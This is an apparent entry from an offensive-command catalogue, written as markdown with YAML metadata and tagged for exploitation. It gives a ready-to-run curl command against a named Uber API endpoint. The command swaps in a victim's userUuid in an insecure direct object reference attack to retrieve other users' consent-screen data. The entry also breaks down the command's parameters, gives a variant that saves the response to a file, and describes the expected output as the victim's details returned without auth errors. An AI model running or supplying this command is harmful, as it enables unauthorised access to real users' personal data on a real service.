---
id: c2e3f4g5-h6i7-8902-efgh-5678901234
data: >-
  curl -X POST
  'https://bonjour.uber.com/marketplace/_rpc?rpc=getConsentScreenDetails' -H
  'Content-Type: application/json' -d '{"userUuid": "victim-uuid-here"}'
tags:
  - exploitation
  - idor
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:25:22.959Z'
verified: false
validated: true
submitted: true
---
# curl-post-uber-idor

## Command

```bash
curl -X POST 'https://bonjour.uber.com/marketplace/_rpc?rpc=getConsentScreenDetails' -H 'Content-Type: application/json' -d '{"userUuid": "victim-uuid-here"}'
```

## Description

Sends a POST request to Uber's API with a manipulated 'userUuid' to exploit IDOR, retrieving unauthorized user data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-H 'Content-Type: application/json'` | JSON content type | Yes |
| `-d '{...}'` | Payload with victim's UUID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://bonjour.uber.com/marketplace/_rpc?rpc=getConsentScreenDetails' -H 'Content-Type: application/json' -d '{"userUuid": "victim-uuid-here"}'
```

### Advanced Usage

Save output to file:
```bash
curl -X POST 'https://bonjour.uber.com/marketplace/_rpc?rpc=getConsentScreenDetails' -H 'Content-Type: application/json' -d '{"userUuid": "victim-uuid-here"}' -o idor_response.json
```

## Expected Output

JSON response with victim's consent screen details, no auth errors.

## Related

- [[Related Procedure: Manipulate-userUuid-for-IDOR]]
